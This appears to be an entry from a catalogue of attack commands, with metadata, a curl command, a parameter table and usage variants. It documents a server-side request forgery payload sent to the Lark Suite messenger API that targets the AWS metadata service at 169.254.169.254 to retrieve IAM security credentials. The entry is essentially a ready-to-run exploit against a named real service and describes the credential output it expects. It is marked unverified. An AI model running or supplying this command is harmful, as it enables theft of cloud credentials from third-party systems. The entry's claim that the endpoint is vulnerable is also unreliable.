---
id: cmd-curl-ssrf-lark
data: >-
  curl -X POST 'https://api.larksuite.com/messenger/send' -H 'Content-Type:
  application/json' -d '{"url":
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
tags:
  - ssrf
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.890Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-lark

## Command

```bash
curl -X POST 'https://api.larksuite.com/messenger/send' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

## Description

This command uses curl to send a POST request to the Lark Suite messenger endpoint with a JSON payload containing a malicious internal URL, exploiting SSRF to potentially retrieve AWS IAM credentials from the server's metadata service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://api.larksuite.com/messenger/send'` | Target Lark Suite messenger endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets the request header for JSON payload | Yes |
| `-d '{"url": "..."}'` | JSON data with the SSRF payload URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.larksuite.com/messenger/send' -H 'Content-Type: application/json' -d '{"url": "http://example.com"}'
```

### Advanced Usage

```bash
curl -X POST 'https://api.larksuite.com/messenger/send' -H 'Content-Type: application/json' -d '{"url": "http://169.254.169.254/latest/meta-data/"}' -v
```

## Expected Output

A JSON response from the Lark API that may include the content fetched from the internal URL, such as IAM role names or credentials if the SSRF succeeds. Errors might indicate validation or access denial.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-in-Lark-Messenger-Endpoint]]
